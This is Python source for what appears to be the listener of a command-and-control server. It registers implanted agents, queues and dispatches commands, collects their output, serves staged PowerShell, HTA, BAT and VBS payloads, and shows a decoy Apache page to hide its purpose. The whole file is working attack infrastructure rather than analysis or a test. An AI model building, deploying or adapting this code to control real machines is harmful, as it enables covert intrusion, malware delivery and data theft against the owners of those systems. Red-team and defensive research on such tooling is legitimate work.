"""
Per-listener WSGI application.

Each listener thread runs this app which:
  1. Serves staged payloads at their configured paths
  2. Handles C2 traffic (checkin / beacon / result)
  3. Records every inbound request as a Callback
  4. Returns profile-disguised responses for unrecognised paths
"""

import json
import logging
import uuid
from datetime import datetime, timezone
from io import BytesIO

from werkzeug.wrappers import Request, Response

logger = logging.getLogger(__name__)


def _utcnow():
    return datetime.now(timezone.utc)


def _json_response(data: dict, status: int = 200, headers: dict | None = None) -> Response:
    body = json.dumps(data, default=str)
    resp = Response(body, status=status, content_type='application/json')
    if headers:
        for k, v in headers.items():
            resp.headers[k] = v
    return resp


def build_listener_wsgi_app(listener_row, flask_app):
    """
    Factory that returns a WSGI callable bound to a specific Listener DB row.
    The Flask app reference is needed for DB access inside the request handler.
    """

    listener_id = listener_row.id
    profile_id = listener_row.profile_id

    # Pre-load profile data so we don't need a DB hit for every decoy response
    profile_data = _load_profile(listener_row, flask_app)

    def application(environ, start_response):
        """WSGI entry point for every inbound request on this listener."""
        req = Request(environ)

        with flask_app.app_context():
            # Record every request as a callback
            _record_callback(req, listener_id)

            path = req.path.rstrip('/')
            method = req.method.upper()

            # ── C2 routes ──────────────────────────────────────────────
            if path == '/api/c2/checkin' and method == 'POST':
                return _handle_checkin(req, listener_id)(environ, start_response)

            if path == '/api/c2/beacon' and method == 'POST':
                return _handle_beacon(req, listener_id)(environ, start_response)

            if path == '/api/c2/result' and method == 'POST':
                return _handle_result(req, listener_id)(environ, start_response)

            # Alias: /api/agents/register  →  checkin
            if path == '/api/agents/register' and method == 'POST':
                return _handle_checkin(req, listener_id)(environ, start_response)

            # Alias: /api/agents/<id>/heartbeat
            if path.startswith('/api/agents/') and path.endswith('/heartbeat') and method == 'POST':
                return _handle_heartbeat(req, path, listener_id)(environ, start_response)

            # Alias: /api/agents/<id>/tasks  (GET = beacon)
            if path.startswith('/api/agents/') and path.endswith('/tasks') and method == 'GET':
                agent_id = path.split('/')[3]
                return _handle_beacon_by_id(req, agent_id, listener_id)(environ, start_response)

            # Alias: /api/agents/<id>/results (POST = result)
            if path.startswith('/api/agents/') and path.endswith('/results') and method == 'POST':
                agent_id = path.split('/')[3]
                return _handle_result_by_id(req, agent_id, listener_id)(environ, start_response)

            # ── Staged payloads ────────────────────────────────────────
            staged = _try_serve_staged(req, listener_id)
            if staged is not None:
                return staged(environ, start_response)

            # ── Decoy / default response ──────────────────────────────
            return _decoy_response(profile_data)(environ, start_response)

    return application


# ---------------------------------------------------------------------------
# Profile helpers
# ---------------------------------------------------------------------------

def _load_profile(listener_row, flask_app) -> dict:
    """Load profile data once at listener start."""
    with flask_app.app_context():
        from models import ListenerProfile
        profile = None
        if listener_row.profile_id:
            profile = ListenerProfile.query.get(listener_row.profile_id)

        if profile:
            custom = {}
            try:
                custom = json.loads(profile.custom_headers) if profile.custom_headers else {}
            except (json.JSONDecodeError, TypeError):
                pass
            return {
                'server_header': profile.server_header or 'Apache/2.4.54 (Ubuntu)',
                'custom_headers': custom,
                'body': profile.default_response_body or '<html><body><h1>It works!</h1></body></html>',
                'content_type': profile.default_content_type or 'text/html',
            }

    # Fallback — no profile
    return {
        'server_header': 'Apache/2.4.54 (Ubuntu)',
        'custom_headers': {},
        'body': '<html><body><h1>It works!</h1></body></html>',
        'content_type': 'text/html',
    }


def _decoy_response(profile_data: dict) -> Response:
    headers = {'Server': profile_data['server_header']}
    headers.update(profile_data['custom_headers'])
    return Response(
        profile_data['body'],
        status=200,
        content_type=profile_data['content_type'],
        headers=headers,
    )


# ---------------------------------------------------------------------------
# Callback recording
# ---------------------------------------------------------------------------

def _record_callback(req: Request, listener_id: int):
    """Persist every inbound request to the callbacks table."""
    try:
        from models import db, Callback
        headers_dict = dict(req.headers)
        body = None
        if req.method in ('POST', 'PUT', 'PATCH'):
            body = req.get_data(as_text=True)[:10_000]

        cb = Callback(
            listener_id=listener_id,
            source_ip=req.remote_addr or '0.0.0.0',
            hostname=headers_dict.get('X-Hostname'),
            user_agent=headers_dict.get('User-Agent', '')[:512],
            request_method=req.method,
            request_path=req.path[:1024],
            request_headers=json.dumps(headers_dict, default=str)[:8000],
            request_body=body,
            timestamp=_utcnow(),
        )
        db.session.add(cb)
        db.session.commit()
    except Exception:
        logger.exception("Failed to record callback for listener %s", listener_id)
        try:
            from models import db
            db.session.rollback()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# C2 Handlers
# ---------------------------------------------------------------------------

def _parse_json(req: Request) -> dict | None:
    try:
        return json.loads(req.get_data(as_text=True))
    except (json.JSONDecodeError, TypeError):
        return None


def _handle_checkin(req: Request, listener_id: int) -> Response:
    """Agent registration / check-in."""
    from models import db, Agent
    data = _parse_json(req) or {}

    hostname = str(data.get('hostname', ''))[:256]
    username = str(data.get('username', data.get('user', '')))[:256]
    os_info = str(data.get('os', data.get('os_info', '')))[:512]
    internal_ip = str(data.get('ip', data.get('internal_ip', '')))[:45]
    external_ip = (req.remote_addr or '')[:45]

    # Smart dedup: same hostname + username + internal_ip → same agent
    existing = Agent.query.filter_by(
        hostname=hostname, username=username, internal_ip=internal_ip
    ).first()

    now = _utcnow()

    if existing:
        existing.external_ip = external_ip
        existing.last_seen = now
        existing.status = 'active'
        if listener_id:
            existing.listener_id = listener_id
        if os_info:
            existing.os_info = os_info
        # Merge extra metadata
        meta = {}
        try:
            meta = json.loads(existing.metadata_json) if existing.metadata_json else {}
        except (json.JSONDecodeError, TypeError):
            pass
        for k in ('pid', 'arch', 'domain', 'privileges'):
            if k in data:
                meta[k] = data[k]
        existing.metadata_json = json.dumps(meta, default=str)
        db.session.commit()
        agent_id = existing.id
        sleep_interval = existing.sleep_interval
        jitter = existing.jitter
    else:
        agent_id = str(uuid.uuid4())
        agent = Agent(
            id=agent_id,
            hostname=hostname,
            username=username,
            os_info=os_info,
            internal_ip=internal_ip,
            external_ip=external_ip,
            listener_id=listener_id,
            status='active',
            first_seen=now,
            last_seen=now,
            metadata_json=json.dumps({k: data[k] for k in ('pid', 'arch', 'domain', 'privileges') if k in data}, default=str),
        )
        db.session.add(agent)
        db.session.commit()
        sleep_interval = agent.sleep_interval
        jitter = agent.jitter

    return _json_response({
        'agent_id': agent_id,
        'sleep': sleep_interval,
        'jitter': jitter,
    })


def _handle_beacon(req: Request, listener_id: int) -> Response:
    """Beacon poll: agent sends its id, gets pending tasks."""
    from models import db, Agent, AgentTask
    data = _parse_json(req) or {}
    agent_id = str(data.get('agent_id', ''))[:36]

    if not agent_id:
        return _json_response({'error': 'agent_id required'}, 400)

    agent = Agent.query.get(agent_id)
    if not agent:
        return _json_response({'error': 'unknown agent'}, 404)

    agent.last_seen = _utcnow()
    agent.external_ip = (req.remote_addr or '')[:45]
    agent.status = 'active'
    if listener_id:
        agent.listener_id = listener_id

    # Fetch queued tasks
    tasks = AgentTask.query.filter_by(agent_id=agent_id, status='queued').order_by(AgentTask.created_at.asc()).all()
    task_list = []
    for t in tasks:
        task_list.append({'id': t.id, 'command': t.command, 'type': t.task_type})
        t.status = 'sent'
        t.sent_at = _utcnow()

    db.session.commit()

    return _json_response({
        'tasks': task_list,
        'sleep': agent.sleep_interval,
        'jitter': agent.jitter,
    })


def _handle_beacon_by_id(req: Request, agent_id: str, listener_id: int) -> Response:
    """GET /api/agents/<id>/tasks — alternative beacon endpoint."""
    from models import db, Agent, AgentTask

    agent = Agent.query.get(agent_id)
    if not agent:
        return _json_response({'error': 'unknown agent'}, 404)

    agent.last_seen = _utcnow()
    agent.status = 'active'
    if listener_id:
        agent.listener_id = listener_id

    tasks = AgentTask.query.filter_by(agent_id=agent_id, status='queued').order_by(AgentTask.created_at.asc()).all()
    task_list = []
    for t in tasks:
        task_list.append({'id': t.id, 'command': t.command, 'type': t.task_type})
        t.status = 'sent'
        t.sent_at = _utcnow()

    db.session.commit()
    return _json_response({'tasks': task_list})


def _handle_result(req: Request, listener_id: int) -> Response:
    """POST /api/c2/result — agent submits task output."""
    from models import db, Agent, AgentTask
    data = _parse_json(req) or {}

    agent_id = str(data.get('agent_id', ''))[:36]
    task_id = str(data.get('task_id', ''))[:36]
    result_text = str(data.get('result', data.get('output', '')))[:50_000]
    success = data.get('success', True)

    if not agent_id or not task_id:
        return _json_response({'error': 'agent_id and task_id required'}, 400)

    agent = Agent.query.get(agent_id)
    if agent:
        agent.last_seen = _utcnow()
        agent.status = 'active'

    task = AgentTask.query.get(task_id)
    if task and task.agent_id == agent_id:
        task.result = result_text
        task.success = bool(success)
        task.status = 'completed'
        task.completed_at = _utcnow()

    db.session.commit()
    return _json_response({'status': 'ok'})


def _handle_result_by_id(req: Request, agent_id: str, listener_id: int) -> Response:
    """POST /api/agents/<id>/results — alternative result endpoint."""
    from models import db, Agent, AgentTask
    data = _parse_json(req) or {}

    task_id = str(data.get('task_id', ''))[:36]
    result_text = str(data.get('result', data.get('output', '')))[:50_000]
    success = data.get('success', True)

    agent = Agent.query.get(agent_id)
    if agent:
        agent.last_seen = _utcnow()
        agent.status = 'active'

    if task_id:
        task = AgentTask.query.get(task_id)
        if task and task.agent_id == agent_id:
            task.result = result_text
            task.success = bool(success)
            task.status = 'completed'
            task.completed_at = _utcnow()

    db.session.commit()
    return _json_response({'status': 'ok'})


def _handle_heartbeat(req: Request, path: str, listener_id: int) -> Response:
    """POST /api/agents/<id>/heartbeat — keep-alive."""
    from models import db, Agent
    parts = path.strip('/').split('/')
    agent_id = parts[2] if len(parts) >= 4 else ''

    agent = Agent.query.get(agent_id)
    if not agent:
        return _json_response({'error': 'unknown agent'}, 404)

    agent.last_seen = _utcnow()
    agent.status = 'active'
    if listener_id:
        agent.listener_id = listener_id
    db.session.commit()

    return _json_response({'status': 'ok', 'sleep': agent.sleep_interval})


# ---------------------------------------------------------------------------
# Staged payload serving
# ---------------------------------------------------------------------------

def _try_serve_staged(req: Request, listener_id: int) -> Response | None:
    """If the request path matches a staged payload, serve it."""
    from models import db, StagedPayload

    path = req.path  # e.g. /update.js
    staged = StagedPayload.query.filter_by(
        listener_id=listener_id, stage_path=path, is_active=True
    ).first()

    if staged is None:
        return None

    staged.download_count += 1
    db.session.commit()

    content_type = 'application/octet-stream'
    if staged.payload_type == 'ps1':
        content_type = 'text/plain'
    elif staged.payload_type == 'hta':
        content_type = 'application/hta'
    elif staged.payload_type in ('bat', 'vbs'):
        content_type = 'text/plain'

    return Response(staged.content, status=200, content_type=content_type)
